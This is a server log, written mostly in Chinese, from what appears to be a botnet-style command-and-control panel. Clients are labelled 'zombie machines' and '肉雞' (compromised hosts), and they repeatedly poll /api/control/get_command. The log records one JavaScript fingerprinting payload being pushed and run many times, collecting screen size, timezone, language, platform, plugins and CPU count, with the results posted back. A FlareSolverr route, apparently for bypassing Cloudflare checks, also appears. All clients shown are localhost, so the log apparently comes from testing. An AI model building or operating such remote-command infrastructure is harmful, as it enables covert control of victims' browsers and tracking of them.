2025-06-26 22:59:37 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:37.131Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0038s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:37] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:59:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:42 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:59:42 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:42.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0033s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:42] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:59:43 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:59:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:43] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:59:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:47 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:59:47 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:47.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:47] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:59:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:52 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:59:52 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:52.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0038s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:52] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:59:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:59:57 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:59:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:59:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:59:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:59:57 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:59:57.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:59:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0050s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:59:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:59:57] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:02 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:02 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:02.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0050s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:02] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:07 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:07 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:07.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0050s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:07] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:12 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:12 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:12.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0041s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:12] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:17 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:17 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:17.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:17] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:22 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:22 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:22.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0038s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:22] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:27 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:27 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:27.128Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0040s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:27] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:00:32 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:00:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:00:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:00:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:00:32 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:00:32.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:00:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:00:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:32] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:00:44 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:00:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:00:44] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:01:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:01:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:01:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:01:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:01:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:01:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:01:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:01:05.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:01:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0031s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:01:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:01:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:01:45 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:01:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:01:45] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:02:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:02:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:02:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:02:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:02:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:02:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:02:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:02:05.132Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": false,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:02:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:02:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:02:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:02:46 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:02:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:02:46] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:03:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:03:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:03:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:03:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:03:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:03:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
